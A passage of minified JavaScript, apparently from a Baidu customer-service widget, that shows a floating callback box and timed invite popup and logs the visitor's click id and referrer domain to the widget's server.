m=/display:\s{0,2}[a-z\s{0,2}!]*;/i;j.main.style.cssText=j.main.style.cssText.replace(m,l)}f.init=function(l){g=l;b();d()};f.show=function(l){showStatus=="float"?c("display: block!important;"):j.closeBtn.style.display="";j.floatInput?null:j.floatInput=a.q("lxb-cb-input",j.main)[0];j.floatInput.value=l};f.hide=function(){j.callback.getTip().hide();showStatus=="float"?c("display: none;"):j.closeBtn.style.display="none"}});lxb.add("business.invite",function(h){var c=lxb.use("base");var i=lxb.use("util");var g=lxb.use("business.tel");var p=lxb.use("business.callback");var n={};var m=[];var a=null;var d="";function b(){var t=i.getInvite();var s=c.create("div");s.innerHTML=t.container;n.main=c.q("lxb-invite",s)[0];n.main.id="LXB_INVITE";document.body.appendChild(n.main);g.init(n.main);n.callback=p.init(n.main);n.main.style.position="fixed";n.main.style.top=n.main.style.left="";var r=n.main.offsetHeight;var u=n.main.offsetWidth;n.main.style.cssText+=t.style;if(t.position==0){n.main.style.marginTop=-(r/2)+"px";n.main.style.marginLeft=-(u/2)+"px"}if(c.ie<=6||(c.ie==7&&document.compatMode!="CSS1Compat")){c.setFixed(n.main)}n.main.style.display="none";if(c.ie&&c.ie<=6){n.mask=c.create("iframe",{frameBorder:0,className:"lxb-container-mask"});n.main.appendChild(n.mask);i.setMaskSize(n.main,n.mask)}}function f(){var r=function(){m=[]};var s=function(y){y=y||window.event;var x=y.target||y.srcElement;if(x.className=="lxb-group-btn"){r()}};var w=function(x){x=x||window.event;if(x.keycode===13){r()}};var u=n.callback.getInput();var v=n.callback.getBtn();var t=n.callback.getGroup();c.addHandler(u,"keydown",w);c.addHandler(v,"click",r);c.addHandler(t,"click",s);n.hideBtn=c.q("lxb-hide-btn",n.main)[0];n.hideBtn.onclick=function(){e();j();a.show(d)}}function l(){var w=i.getInviteWay();var r=w.stayTime;var v=w.inviteTimes;var t=w.inviteInterval;var s=w.closeTime||99999;m.push({delay:r,callback:function(){if(h.isShow()){q();a.hide();o(d)}}});m.push({delay:s,callback:function(){e();j();a.show(d)}});v--;for(var u=0;u<v;u++){m.push({delay:t,callback:function(){if(h.isShow()){q();a.hide();o(d)}}});m.push({delay:s,callback:function(){e();j();a.show(d)}})}k()}function k(){var r=m.shift();if(!r){return}var s=function(){var t=(new Date()).valueOf();if((t-n.callback.opTimer[0])<3000){setTimeout(s,3000)}else{r.callback.call(null)}};setTimeout(s,r.delay*1000)}function q(){n.floatInput?null:n.floatInput=c.q("lxb-cb-input")[0];n.floatInput.value===""?(d=lxb.use("config").Lang.CB_INPUT_TIP_HOLDER):(d=n.floatInput.value)}function e(){n.inviteInput?null:n.inviteInput=c.q("lxb-cb-input",n.main)[0];n.inviteInput.value===""?(d=lxb.use("config").Lang.CB_INPUT_TIP_HOLDER):(d=n.inviteInput.value)}h.init=function(){b();f()};h.isShow=function(){if(c.getCookie("isCalled")==="called"){return false}return true};var j=h.hide=function(){n.callback.getTip().hide();n.main.style.display="none";k()};var o=h.show=function(r){if(c.getCookie("isCalled")==="called"){return}n.main.style.display="";n.inviteInput?null:n.inviteInput=c.q("lxb-cb-input",n.main)[0];n.inviteInput.value=r;k()};h.begin=function(r){a=r;if(i.ifStartPage()===0){l()}else{if(i.ifStartPage()===1){if(i.isLoadPage()){l()}}}}});(function(){var j=lxb.use("util");var h=lxb.use("business.run");function d(v){var u=lxb.use("net");if(!!v.status){u.log("error","init");return}var s=v.data;j.init(s);if(s.replace&&s.phone){try{lxb.use("business.replacer").run()}catch(t){u.log("error","replace")}}if(!s.float_window||s.float_window=="0"){return{}}var r=lxb.use("config").Root+"/asset/float.css";u.loadCSS(r);h.run()}function l(){var e=location.search?location.search.substring(1):"";e=c.queryToJSON(e);return e.bdclkid}function f(){var e=document.referrer;e=e.replace(/^https?:\/\//,"").split("/");return e[0].replace(/:.*$/,"")}function o(t){var e="";var r=[".com",".co",".cn",".info",".net",".org",".me",".mobi",".us",".biz",".xxx",".ca",".co.jp",".com.cn",".net.cn",".org.cn",".gov.cn",".mx",".tv",".ws",".ag",".com.ag",".net.ag",".org.ag",".am",".asia",".at",".be",".com.br",".net.br",".bz",".com.bz",".net.bz",".cc",".com.co",".net.co",".nom.co",".de",".es",".com.es",".nom.es",".org.es",".eu",".fm",".fr",".gs",".in",".co.in",".firm.in",".gen.in",".ind.in",".net.in",".org.in",".it",".jobs",".jp",".ms",".com.mx",".nl",".nu",".co.nz",".net.nz",".org.nz",".se",".tc",".tk",".tw",".com.tw",".com.hk",".idv.tw",".org.tw",".hk",".co.uk",".me.uk",".org.uk",".vg",".name"];r=r.join("|").replace(".","\\.");var s=new RegExp("\\.?([^.]+("+r+"))$");t.replace(s,function(v,u){e=u});return e}if(window.top!=window){try{if(window.parent.document.getElementsByTagName("frameset")[0]){}else{lxb.instance++}}catch(k){}}if(lxb.instance>1){return}var g=lxb.use("config");var m=lxb.use("net");var c=lxb.use("base");var a=g.Root+"/_l.js";var n=l();if(!n){n=c.getCookie(g.ID.COOKIE_DBCLKID)}else{c.setCookie(g.ID.COOKIE_DBCLKID,n)}var q=g.bdcbid;var p=f();if(!p||o(p)==o(location.hostname)){p=c.getCookie(g.ID.COOKIE_REFER)}else{var b=p+"; path=/";if(location.hostname.indexOf("baidu.com")<0){b+="; domain=."+o(location.hostname)}c.setCookie(g.ID.COOKIE_REFER,b)}var i={siteid:g.SiteId,bdclickid:n||"",bdcbid:q||"",refer_domain:p||""};m.send(a,i,d);j.visitorLog(1,g.SiteId)})();
